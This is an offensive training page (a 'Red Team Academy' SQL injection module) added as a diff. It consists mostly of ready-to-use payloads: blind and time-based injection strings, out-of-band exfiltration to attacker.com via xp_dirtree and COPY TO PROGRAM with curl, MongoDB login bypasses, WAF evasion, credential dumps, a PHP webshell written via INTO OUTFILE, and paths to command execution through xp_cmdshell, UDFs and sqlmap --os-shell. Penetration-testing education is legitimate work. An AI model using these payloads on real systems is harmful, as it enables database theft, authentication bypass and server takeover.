@@ -1,0 +1,253 @@
+---
+layout: training-page
+title: "SQL Injection — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - sqli
+  - blind
+  - oob
+  - nosql
+  - waf-bypass
+page_key: "web-sql-injection"
+---
+<h1>SQL Injection</h1>
+  <p>SQL injection remains one of the highest-impact web vulnerabilities. Beyond basic union-based extraction, modern engagements rely on blind techniques (boolean and time-based), out-of-band (OOB) data exfiltration, second-order injection, and NoSQL variants. This page covers the full attack chain from detection to shells.</p>
+
+  <h2>Detection — Fingerprinting Injection Points</h2>
+  <pre><code># Error-based detection (single quote):
+https://target/item?id=1'      # syntax error → injectable
+https://target/item?id=1\      # MySQL escaping error
+https://target/item?id=1--     # comment truncates query
+
+# Boolean-based confirmation:
+?id=1 AND 1=1    # → same response as normal
+?id=1 AND 1=2    # → different/empty response → blind injectable
+
+# Time-based confirmation (blind, no output difference):
+# MySQL:
+?id=1 AND SLEEP(5)
+# PostgreSQL:
+?id=1; SELECT pg_sleep(5)--
+# MSSQL:
+?id=1; WAITFOR DELAY '0:0:5'--
+# Oracle:
+?id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
+
+# sqlmap automatic detection:
+sqlmap -u "https://target/item?id=1" --batch --dbs
+sqlmap -u "https://target/item?id=1" --level=5 --risk=3 --batch</code></pre>
+
+  <h2>Boolean-Based Blind SQLi</h2>
+  <p>No output, but response changes based on TRUE/FALSE condition. Enumerate data bit by bit.</p>
+  <pre><code># Manual boolean blind — extract DB name character by character:
+# Confirm first character of database name is 'd' (ASCII 100):
+?id=1 AND SUBSTRING(database(),1,1)='d'--
+?id=1 AND ORD(SUBSTR(database(),1,1))=100--
+
+# Automate with sqlmap:
+sqlmap -u "https://target/page?id=1" --technique=B --batch \
+  --dbs --level=3
+
+# Custom blind injection script (Python):
+# import requests
+# for i in range(1, 20):
+#   for c in range(32, 127):
+#     r = requests.get(f"https://target/page?id=1 AND ORD(SUBSTR(database(),&#123;i&#125;,1))=&#123;c&#125;--")
+#     if "Welcome" in r.text:  # true condition marker
+#       print(chr(c), end='')
+#       break</code></pre>
+
+  <h2>Time-Based Blind SQLi</h2>
+  <p>No response difference at all — purely timing side-channel.</p>
+  <pre><code># MySQL time-based blind:
+# True condition = 5 second delay, false = no delay
+?id=1 AND IF(1=1,SLEEP(5),0)--
+?id=1 AND IF(SUBSTRING(database(),1,1)='d',SLEEP(5),0)--
+
+# sqlmap time-based:
+sqlmap -u "https://target/page?id=1" --technique=T --batch \
+  --dbs --time-sec=3
+
+# MSSQL stacked query time-based (when stacked queries allowed):
+?id=1; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:5'--
+
+# Conditional error-based (extractvia error messages):
+# MySQL:
+?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+?id=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--</code></pre>
+
+  <h2>Out-of-Band (OOB) SQL Injection</h2>
+  <p>Exfiltrate data via DNS or HTTP requests — useful when response and timing channels are blocked.</p>
+  <pre><code># MySQL OOB via DNS (requires FILE privilege + DNS callback):
+# Use Burp Collaborator or interactsh for DNS callback
+?id=1 AND LOAD_FILE(CONCAT('\\\\',database(),'.BURP-COLLAB.burpcollaborator.net\\a'))--
+
+# MySQL OOB via HTTP (SELECT INTO OUTFILE to UNC path):
+?id=1 UNION SELECT 1,2,load_file(0x2f6574632f706173737764)-- -
+# (0x2f6574632f706173737764 = /etc/passwd)
+
+# MSSQL OOB via DNS (xp_dirtree — no special privilege needed):
+?id=1; DECLARE @q NVARCHAR(1024);
+SET @q=CONCAT('\\',@@version,'.attacker.com\a');
+EXEC xp_dirtree @q--
+
+# MSSQL OOB via linked server:
+?id=1; EXEC master.dbo.xp_dirtree '//attacker.com/a'--
+
+# PostgreSQL OOB COPY:
+?id=1; COPY (SELECT current_database()) TO PROGRAM 'curl http://attacker.com/exfil?d='||current_database()--
+
+# sqlmap OOB with DNS:
+sqlmap -u "https://target/page?id=1" --dns-domain=attacker.com --batch --dbs</code></pre>
+
+  <h2>Second-Order (Stored) SQL Injection</h2>
+  <p>Input stored safely, but retrieved later and used in a SQL query without sanitization.</p>
+  <pre><code># Example: registration stores username, but password-reset query is:
+# SELECT * FROM users WHERE username='$username' AND email='$email'
+# Register with username: admin'--
+# Password reset query becomes:
+# SELECT * FROM users WHERE username='admin'-- ' AND email='anything'
+# → authenticates as admin
+
+# Detection: look for user-controlled data appearing in later queries
+# Common locations:
+# - Username/profile fields → password reset, search
+# - Product names/descriptions → order confirmations, invoices
+# - Comments/reviews → moderation panels
+
+# Manual testing: inject into registration/profile, then trigger the later action
+# Use a SLEEP() payload in stored field — check if sleep fires on retrieval</code></pre>
+
+  <h2>NoSQL Injection (MongoDB)</h2>
+  <p>MongoDB queries use JSON operators. Injecting operator objects bypasses equality checks.</p>
+  <pre><code># MongoDB operator injection — login bypass:
+# Normal query: db.users.find&#123;username: "input", password: "input"&#125;)
+# Inject: username[$ne]=invalid&password[$ne]=invalid
+# → db.users.find&#123;username: &#123;$ne: "invalid"&#125;, password: &#123;$ne: "invalid"&#125;&#125;)
+# → returns first user (admin)
+
+# HTTP form POST injection:
+POST /login
+username[$ne]=x&password[$ne]=x
+
+# JSON POST injection:
+&#123;"username": &#123;"$ne": "x"&#125;, "password": &#123;"$ne": "x"&#125;&#125;
+
+# Regex injection (enumerate users):
+&#123;"username": &#123;"$regex": "^a"&#125;, "password": &#123;"$ne": ""&#125;&#125;  # usernames starting with 'a'
+&#123;"username": &#123;"$regex": "^ad"&#125;, "password": &#123;"$ne": ""&#125;&#125; # starting with 'ad'
+
+# $where injection (JavaScript execution in MongoDB 3.x):
+&#123;"username": "admin", "$where": "sleep(5000)"&#125;
+
+# Tools:
+# NoSQLMap: https://github.com/codingo/NoSQLMap
+# nosql-injection-fuzzer, Burp extension "NoSQL Scanner"
+python nosqlmap.py -u "http://target/login" --attack 1</code></pre>
+
+  <h2>WAF Bypass Techniques</h2>
+  <pre><code># Encoding bypasses:
+# URL encode: ' → %27, space → %20
+# Double URL encode: ' → %2527
+# Unicode: %u0027 → '
+
+# Case variation:
+UniOn SeLeCt UsEr()
+
+# Inline comments (MySQL):
+UN/**/ION SEL/**/ECT 1,2,3--
+UN/*!ION*/ /*!SEL*/ECT 1,2,3--
+
+# Whitespace alternatives:
+# Tab (%09), newline (%0a), carriage return (%0d)
+UNION%09SELECT%091,2,3--
+UNION%0aSELECT%0a1,2,3--
+
+# Alternative operators:
+# OR → ||, AND → &&, = → LIKE, != → <>
+1 UNION SELECT IF(1||1,1,0),2,3--
+
+# sqlmap tamper scripts:
+sqlmap -u "URL" --tamper=space2comment,randomcase,charunicodeescape \
+  --level=5 --risk=3
+
+# Common tamper scripts:
+# space2comment → spaces become /**/
+# randomcase → raNdOM cAsE
+# charunicodeescape → unicode escaping
+# between → > becomes NOT BETWEEN 0 AND
+# greatest → GREATEST() instead of >
+# equaltolike → = becomes LIKE
+
+# HPP (HTTP Parameter Pollution):
+?id=1&id=UNION SELECT 1,2,3--
+
+# HTTP header injection:
+X-Forwarded-For: 127.0.0.1' OR '1'='1
+User-Agent: ' OR 1=1--</code></pre>
+
+  <h2>UNION-Based Extraction</h2>
+  <pre><code># Step 1: Find column count (ORDER BY method):
+?id=1 ORDER BY 1--   # works
+?id=1 ORDER BY 2--   # works
+?id=1 ORDER BY 5--   # error → 4 columns
+
+# Step 2: Find printable columns (NULL method):
+?id=0 UNION SELECT NULL,NULL,NULL,NULL--
+?id=0 UNION SELECT 'a',NULL,NULL,NULL--  # try each position
+
+# Step 3: Extract data:
+?id=0 UNION SELECT @@version,database(),user(),@@datadir--
+
+# Extract all tables:
+?id=0 UNION SELECT group_concat(table_name),2,3,4
+  FROM information_schema.tables WHERE table_schema=database()--
+
+# Extract columns from table:
+?id=0 UNION SELECT group_concat(column_name),2,3,4
+  FROM information_schema.columns WHERE table_name='users'--
+
+# Dump credentials:
+?id=0 UNION SELECT group_concat(username,0x3a,password),2,3,4 FROM users--
+
+# Read files (MySQL with FILE privilege):
+?id=0 UNION SELECT load_file('/etc/passwd'),2,3,4--
+
+# Write webshell (MySQL with write access):
+?id=0 UNION SELECT '&lt;?php system($_GET["cmd"]); ?&gt;',2,3,4
+  INTO OUTFILE '/var/www/html/shell.php'--</code></pre>
+
+  <h2>SQLi to RCE</h2>
+  <pre><code># MySQL → UDF (User Defined Function) RCE:
+# Requires FILE + INSERT privilege, mysql running as root
+# Upload UDF library via SELECT INTO DUMPFILE:
+SELECT 0x[lib_hex] INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
+SELECT sys_exec('id > /tmp/out');
+
+# MSSQL → xp_cmdshell:
+# Enable if disabled:
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+# Execute:
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -enc BASE64PAYLOAD';
+
+# PostgreSQL → COPY TO PROGRAM (≥9.3):
+COPY (SELECT '') TO PROGRAM 'id > /tmp/out';
+# Or as superuser via:
+DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(data text);
+COPY cmd FROM PROGRAM 'id';
+SELECT * FROM cmd;
+
+# sqlmap OS shell:
+sqlmap -u "URL" --os-shell --technique=BEUSTQ</code></pre>
+
+  <h2>Tools &amp; Resources</h2>
+  <ul>
+    <li><code>sqlmap</code> — <code>github.com/sqlmapproject/sqlmap</code></li>
+    <li><code>ghauri</code> — <code>github.com/r0oth3x49/ghauri</code> — newer alternative</li>
+    <li>PortSwigger SQLi labs — <code>portswigger.net/web-security/sql-injection</code></li>
+    <li>PayloadsAllTheThings — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+    <li>HackTricks SQLi — <code>book.hacktricks.xyz/pentesting-web/sql-injection</code></li>
+  </ul>
